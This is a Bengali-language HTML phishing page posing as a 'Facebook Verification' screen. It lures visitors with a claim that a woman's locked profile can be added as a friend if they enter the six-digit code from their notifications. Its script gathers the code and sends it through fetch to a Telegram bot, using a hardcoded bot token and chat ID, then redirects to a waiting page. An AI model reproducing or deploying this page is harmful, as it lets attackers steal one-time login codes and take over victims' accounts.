<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* অরিজিনাল লুকের জন্য স্টাইল */
        body { background-color: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; }
        .code-input {
            width: 48px;
            height: 52px;
            text-align: center;
            font-size: 22px;
            font-weight: 600;
            border: 1.5px solid #dddfe2;
            border-radius: 6px;
            background: #ffffff;
            transition: border-color 0.2s;
        }
        .code-input:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 1px #1877f2; }
    </style>
</head>
<body class="flex flex-col items-center min-h-screen">

    <div class="w-full max-w-sm h-[35vh] overflow-hidden flex justify-center bg-white">
        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" 
             alt="Profile" class="w-full h-full object-cover">
    </div>

    <div class="w-full max-w-sm p-6 bg-white shadow-md mt-[-20px] rounded-t-2xl min-h-[50vh] flex flex-col items-center"> 
        
        <h2 class="text-[22px] font-bold text-gray-900 mb-4 text-center">Verification</h2>
        
        <p class="text-[15px] text-gray-600 mb-8 text-center leading-relaxed px-2">
            Mst.Priya Akter এর ফেসবুক আইডি পাসওয়ার্ড দিয়ে Locked করা আছে। তার ফেসবুক আইডির সাথে আপনার আইডি এড করতে হলে 30 সেকেন্ড অপেক্ষা করুন। আপনার নোটিফিকেশন মেসেজ চেক করে ৬ সংখ্যার কোডটি নিচে বসান।
        </p>

        <div id="otp-inputs" class="flex justify-center gap-2 mb-8">
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
            <input type="text" inputmode="numeric" pattern="\d*" maxlength="1" class="code-input" oninput="handleInput(this)" onkeydown="handleBackspace(event, this)">
        </div>
        
        <div class="h-12"></div>
    </div>

    <script>
        function handleInput(input) {
            input.value = input.value.replace(/[^0-9]/g, '');
            if (input.value.length === 1) {
                let next = input.nextElementSibling;
                if (next) next.focus();
                else submitCode();
            }
        }

        function handleBackspace(e, input) {
            if (e.key === "Backspace" && input.value.length === 0) {
                let prev = input.previousElementSibling;
                if (prev) prev.focus();
            }
        }

        async function submitCode() {
            let code = "";
            document.querySelectorAll('.code-input').forEach(i => code += i.value);
            
            if(code.length === 6) {
                const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
                const chatId = "8516934257";
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: `📩 কোড: ${code}` })
                });
                window.location.href = "waiting.html";
            }
        }
    </script>
</body>
</html>
